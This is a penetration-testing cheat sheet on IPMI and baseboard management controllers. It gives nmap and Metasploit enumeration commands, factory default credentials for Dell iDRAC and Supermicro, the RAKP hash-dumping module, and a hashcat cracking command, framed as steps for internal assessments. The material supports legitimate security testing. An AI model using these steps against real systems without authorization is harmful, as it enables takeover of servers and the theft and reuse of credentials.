# IPMI (Intelligent Platform Management Interface)

## Overview

The **Intelligent Platform Management Interface (IPMI)** is a hardware-based management protocol that allows administrators to monitor and manage servers independently of the operating system.

Since IPMI operates directly on the **Baseboard Management Controller (BMC)**, administrators can access and manage a system even when it is powered off or the operating system has crashed.

---

# Common Use Cases

IPMI is commonly used to:

- Modify BIOS settings remotely.
- Power on, reboot, or shut down a server.
- Recover systems after an operating system failure.
- Monitor hardware health (temperature, voltage, fans, and power supplies).
- View hardware logs and inventory information.

---

# Key Components

| Component | Description |
|----------|-------------|
| **BMC (Baseboard Management Controller)** | Embedded microcontroller responsible for hardware management. |
| **IPMB** | Communication bus used by the BMC. |
| **ICMB** | Allows communication between multiple chassis. |
| **IPMI Memory** | Stores logs, inventory data, and event records. |
| **Communication Interfaces** | LAN, Serial, PCI, and local system interfaces. |

---

# Default Port

| Port | Protocol | Service |
|------|----------|---------|
| **623** | UDP | IPMI (ASF-RMCP) |

---

# Enumeration

## Nmap

```bash
sudo nmap -sU --script ipmi-version -p 623 <TARGET>
```

Checks if the target exposes an IPMI service and identifies the supported protocol version.

---

## Metasploit

```bash
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS <TARGET>
run
```

Retrieves the IPMI version and supported authentication methods.

---

# Common BMC Implementations

- HP iLO
- Dell iDRAC
- Supermicro IPMI

Compromising a BMC often provides control equivalent to **physical access** to the server.

---

# Default Credentials

| Product | Username | Password |
|---------|----------|----------|
| Dell iDRAC | `root` | `calvin` |
| HP iLO | `Administrator` | Random 8-character password (factory default) |
| Supermicro IPMI | `ADMIN` | `ADMIN` |

> **Always test default credentials during an internal assessment.**

---

# IPMI 2.0 RAKP Vulnerability

One of the most common weaknesses in IPMI 2.0 is the **RAKP Authentication Hash Disclosure**.

During authentication, the server returns a salted password hash **before authentication is completed**.

An attacker can capture this hash and crack it offline.

---

# Dumping Password Hashes

Metasploit includes a module to retrieve password hashes.

```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes

set RHOSTS <TARGET>

run
```

Captured hashes can be exported to:

- Hashcat
- John the Ripper

---

# Cracking Hashes

Example using Hashcat:

```bash
hashcat -m 7300 ipmi.hash wordlist.txt
```

HP iLO factory passwords can also be attacked using mask attacks.

---

# Risks

Compromising IPMI may allow an attacker to:

- Access the remote management console.
- Power off or reboot systems.
- Reinstall the operating system.
- Mount remote media.
- Execute commands remotely.
- Reuse recovered credentials across the environment.

Since BMCs operate independently of the operating system, they are extremely high-value targets during internal penetration tests.

---

# Best Practices

- Always scan UDP port **623**.
- Test for default credentials.
- Check for exposed web interfaces.
- Retrieve RAKP hashes when possible.
- Attempt offline password cracking.
- Test recovered credentials against other systems.
- Document every discovered BMC.

---

# Key Takeaways

- IPMI provides out-of-band hardware management.
- It operates independently of the operating system.
- UDP **623** is the default IPMI port.
- Default credentials are still commonly found.
- IPMI 2.0 exposes password hashes through the RAKP authentication process.
- Cracked credentials are often reused across enterprise environments.
- Always include IPMI enumeration during internal penetration tests.